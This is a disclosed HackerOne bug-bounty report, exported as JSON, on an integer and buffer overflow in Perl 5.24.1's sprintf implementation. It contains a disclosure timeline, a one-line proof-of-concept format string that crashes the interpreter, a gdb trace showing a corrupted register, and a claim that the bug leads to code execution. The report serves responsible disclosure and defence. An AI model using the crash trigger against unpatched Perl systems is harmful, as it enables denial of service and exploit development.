{
  "id": 271330,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNzEzMzA=",
  "url": "https://hackerone.com/reports/271330",
  "title": "Format string implementation vulnerability, resulting in code execution",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2017-09-24T16:13:07.324Z",
  "submitted_at": "2017-09-24T16:13:07.324Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "aerodudrizzt",
    "url": "/aerodudrizzt",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQT5SD3VK2%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T141715Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQClRXfVQ6TcJFROTF%2BD0LDL4IptBemJc5EMG848%2FCEiSQIhAKDXmyowzdpDu4zfEapkWcuivUF63JNAxYz2favlbU6bKrIFCBcQAxoMMDEzNjE5Mjc0ODQ5IgyKlpw5OowlLiWsLL8qjwU0D29xrhlZFCfHcqjeZqnfiyItH0QCdyaKA%2F8%2BPGpNz2JgpL6QTAwDZCtHYpJ2OsSV%2Fr0t%2BhiNft4faKC3j2Re4gXFlwXAzQ3UGuAAGxcwgIc7gFmPcZWE0SRhBdJmk2S%2BJos09tCiFdi%2FbxRyB3zF64dzD5fSumyqcEn%2B2Vnd00pMBX742VkbEf7ZrNuyB62b1ytaX9jj9uvCFABG55FHDM%2Bs37wZacobZcdYBUPtU2XeZTkWX7AKGe%2FYmNjN%2FCI%2BxIoV7xxTqcG%2Baq7erC61AYhVA5BQfpjdl1bhHpa12u1DFE7HS57F97QReN6xh059bv%2FTllJIx8plaNjjH2jyflJMGw0Dw2DMiRrS7tIxJhQLAjBMb4C4V7N%2BM%2BaYvfy8%2FfbziqtvAUL8KMu6JyAjiQFuRhibIpqiMs3vU1r2o3TaJvpwb%2F9%2B0noBVyL2mEXDZLSZXRNCnvTiCzHLsk87FJVYtRr2awVVN9HtLz2KvmKgDreKiPAOXfPCFtAQa9YLiWIPUuVtgioN9ZBo5xJaCCyMGIzCh%2Fkrs1a0DcWy4F7Ytp4jBJcaMTR19B9HxNJL3aj8fMZlif8A0f0aaG%2FBgx7o5981IkRN3fvdIme%2FGy59thdwpQWaGEcGFmbADJgW%2FUetzXfy4OHnAUuQN5g8tkLNZhOOMkLBC3kLLrbfeiTttC8hssEuonPS5FvdddJqvftgcN%2Btb6H%2B1mYkyDlIcS6dii1q%2BhZizteMV9E0OBg1K8Ylk36UwJ3sW%2B8VxpTiVst%2FCObvfePMpGyI10NWIZQWKo%2BbxnzRUnD14TtT5uqbGn0QUuAEyUMWhQFS5SK5ZjRVCzQKPJTjGtT1RulMo59rlIi8SANcD1u8orU0MJP5v8YGOrABxqGEwH2lu%2FSIiLkjMB93i6n75LP7E6dFaf8U2coeh%2FJFyPT0Fob%2BvLKn7heOlHaTP86GXxcuQ%2F7dOAFxfCcMZJwPoTg4MLVffgesdH3XcR6WccyCO7CULPqRy39ydkdy5bAD0rlIb4KBU4W2miAyLWCv5A8%2BACxOO2Y%2BdrmDICvpHOjLOqM2jQrXEsy42y2NRm8%2FtGBFtSOfk9J9G5g0mOcoHMA4EPWmf7LR9VvpFQc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3619530084c2fbe24cf8b046cde7ab0dc653bb92d0b915ef2cdaa6510d1cd9af",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQT5SD3VK2%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T141715Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQClRXfVQ6TcJFROTF%2BD0LDL4IptBemJc5EMG848%2FCEiSQIhAKDXmyowzdpDu4zfEapkWcuivUF63JNAxYz2favlbU6bKrIFCBcQAxoMMDEzNjE5Mjc0ODQ5IgyKlpw5OowlLiWsLL8qjwU0D29xrhlZFCfHcqjeZqnfiyItH0QCdyaKA%2F8%2BPGpNz2JgpL6QTAwDZCtHYpJ2OsSV%2Fr0t%2BhiNft4faKC3j2Re4gXFlwXAzQ3UGuAAGxcwgIc7gFmPcZWE0SRhBdJmk2S%2BJos09tCiFdi%2FbxRyB3zF64dzD5fSumyqcEn%2B2Vnd00pMBX742VkbEf7ZrNuyB62b1ytaX9jj9uvCFABG55FHDM%2Bs37wZacobZcdYBUPtU2XeZTkWX7AKGe%2FYmNjN%2FCI%2BxIoV7xxTqcG%2Baq7erC61AYhVA5BQfpjdl1bhHpa12u1DFE7HS57F97QReN6xh059bv%2FTllJIx8plaNjjH2jyflJMGw0Dw2DMiRrS7tIxJhQLAjBMb4C4V7N%2BM%2BaYvfy8%2FfbziqtvAUL8KMu6JyAjiQFuRhibIpqiMs3vU1r2o3TaJvpwb%2F9%2B0noBVyL2mEXDZLSZXRNCnvTiCzHLsk87FJVYtRr2awVVN9HtLz2KvmKgDreKiPAOXfPCFtAQa9YLiWIPUuVtgioN9ZBo5xJaCCyMGIzCh%2Fkrs1a0DcWy4F7Ytp4jBJcaMTR19B9HxNJL3aj8fMZlif8A0f0aaG%2FBgx7o5981IkRN3fvdIme%2FGy59thdwpQWaGEcGFmbADJgW%2FUetzXfy4OHnAUuQN5g8tkLNZhOOMkLBC3kLLrbfeiTttC8hssEuonPS5FvdddJqvftgcN%2Btb6H%2B1mYkyDlIcS6dii1q%2BhZizteMV9E0OBg1K8Ylk36UwJ3sW%2B8VxpTiVst%2FCObvfePMpGyI10NWIZQWKo%2BbxnzRUnD14TtT5uqbGn0QUuAEyUMWhQFS5SK5ZjRVCzQKPJTjGtT1RulMo59rlIi8SANcD1u8orU0MJP5v8YGOrABxqGEwH2lu%2FSIiLkjMB93i6n75LP7E6dFaf8U2coeh%2FJFyPT0Fob%2BvLKn7heOlHaTP86GXxcuQ%2F7dOAFxfCcMZJwPoTg4MLVffgesdH3XcR6WccyCO7CULPqRy39ydkdy5bAD0rlIb4KBU4W2miAyLWCv5A8%2BACxOO2Y%2BdrmDICvpHOjLOqM2jQrXEsy42y2NRm8%2FtGBFtSOfk9J9G5g0mOcoHMA4EPWmf7LR9VvpFQc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c61cc356caa8b862853936701147fc7a2eb4b4ad0cc01f37875e02d83547060d"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-10-13T10:32:46.177Z",
  "bug_reporter_agreed_on_going_public_at": "2019-10-13T10:32:45.951Z",
  "team_member_agreed_on_going_public_at": "2019-10-13T09:39:39.923Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "In a security audit to the sprintf implementation in perl (version 5.24.1) I found a major security vulnerability, here are the full details.\nTimeline:\n======\n* 6th of May, 2017 - disclosure to the PERL security mailing list\n* 8th of May, 2017 - vulnerability confirmed by PERL's security group, found relevant to *all* maintained branches\n* 9th of May, 2017 - patch issued to branches \"blead\"\n* 30th of May, 2017 - a patched 5.26 branch is released\n* 24th of August, 2017 - a patch was committed to the 5.24 branch, awaiting 5.24.3 release\n* 22nd of September, 2017 - 5.24.3 was released, announcing the format string vulnerability in the release notes - public disclosure by the project\n\nTechnical Details:\n===========\nfile: sv.c\nfunction: Perl_sv_vcatpvfn_flags\n\n* precis - represents a format's precision, and can be any size_t value\n* width - represents the format's width, and can be any non-negative size_t value\n* Using large values can cause *multiple Integer-Overflows* when calculating 'need' = the needed allocated space for a fraction\n * line 12300:        need += has_precis ? precis : 6; /* known default */\n * later on more values are added to need (need += 20, ...)\n* Later on the use of 'width' for padding with spaces *assumes* that there is enough space in the buffer, causing a *Buffer Overflow*\n\nPoC Script:\n------------\n```\nprint sprintf(\"%2000.2000f this is a spacer %4000.4294967245a\", 1, 0x0.00008234p+9);\n```\nCrash trace - tested on a 32 bit linux machine:\n--------------------------------------------------\n```\nProgram terminated with signal SIGSEGV, Segmentation fault.\n#0  0x080ebbe0 in Perl_runops_standard ()\n(gdb) bt\n#0  0x080ebbe0 in Perl_runops_standard ()\n#1  0x08069356 in S_fold_constants ()\n#2  0x080a8336 in Perl_yyparse ()\n#3  0x08083219 in perl_parse ()\n#4  0x0806218c in main ()\n(gdb) info reg\neax            0x20202020    538976288\necx            0x9f72900    167192832\nedx            0x0    0\nebx            0x0    0\nesp            0xbfe0e8c0    0xbfe0e8c0\nebp            0x9f6c4d0    0x9f6c4d0\nesi            0x9f6f58c    167179660\nedi            0x0    0\neip            0x80ebbe0    0x80ebbe0 <Perl_runops_standard+16>\neflags         0x10202    [ IF RF ]\ncs             0x73    115\nss             0x7b    123\nds             0x7b    123\nes             0x7b    123\nfs             0x0    0\ngs             0x33    51\n(gdb) x /10i $eip\n=> 0x80ebbe0 <Perl_runops_standard+16>:    call   *0x8(%eax)\n   0x80ebbe3 <Perl_runops_standard+19>:    test   %eax,%eax\n   0x80ebbe5 <Perl_runops_standard+21>:    mov    %eax,0x8207a88\n   0x80ebbea <Perl_runops_standard+26>:    \n    jne    0x80ebbe0 <Perl_runops_standard+16>\n   0x80ebbec <Perl_runops_standard+28>:    mov    0x8207290,%eax\n   0x80ebbf1 <Perl_runops_standard+33>:    test   %eax,%eax\n   0x80ebbf3 <Perl_runops_standard+35>:    \n    jne    0x80ebc02 <Perl_runops_standard+50>\n   0x80ebbf5 <Perl_runops_standard+37>:    movb   $0x0,0x82072b0\n   0x80ebbfc <Perl_runops_standard+44>:    xor    %eax,%eax\n   0x80ebbfe <Perl_runops_standard+46>:    add    $0xc,%esp\n```\nAs you can see, the first %f print enlarged the buffer, and the controllable width in the second overflowed the buffer, causing eax to be corrupt (0x20 == ' '). The program itself crashed when tried to *execute* a pointer pointed by the *controlled* eax register (+8).\n\nThreat Analysis:\n------------------\nThis report demonstrates a potential code execution vulnerability, in case a sprintf format will be hostile. As format string attacks are relatively more popular on C/C++ languages, they are caused by the same programming bad practices:\n* \"Generic\" logging \\ monitoring module that receives format + args, and build the message string\n\nSuch kind of vulnerabilities are still common in modern code projects, and during my career I found such vulnerabilities even in many high-profile companies. Since Perl (such as Python, and Ruby) is a memory-managed language, the programmer relies on the interpreter to \"catch\" problems for him, meaning that most programmers assume that these programs won't be vulnerable to format string attacks.\n\nConclusion:\n========\nThe sprintf implementation has a *severe* vulnerability when handling a hostile format string. This vulnerability was demonstrated and can be easily leveraged into a remote code execution on the Perl interpreter (as I demonstrated previously in a similar vulnerability in a similar interpreter-based project).\n\nWill be more than happy to answer any question regarding the ticket,\nEyal Itkin.",
  "weakness": {
    "id": 2,
    "name": "Memory Corruption - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2019-11-12T09:39:40.015Z",
  "allow_singular_disclosure_after": -184912655.5822856,
  "singular_disclosure_allowed": true,
  "vote_count": 7,
  "voters": [
    "mik317",
    "geeknik",
    "japz",
    "mayabea",
    "script_kid",
    "joeljeezy",
    "unihorn"
  ],
  "severity": {
    "rating": "medium",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 84128,
    "asset_type": "OTHER",
    "asset_identifier": "Perl (Legacy)",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
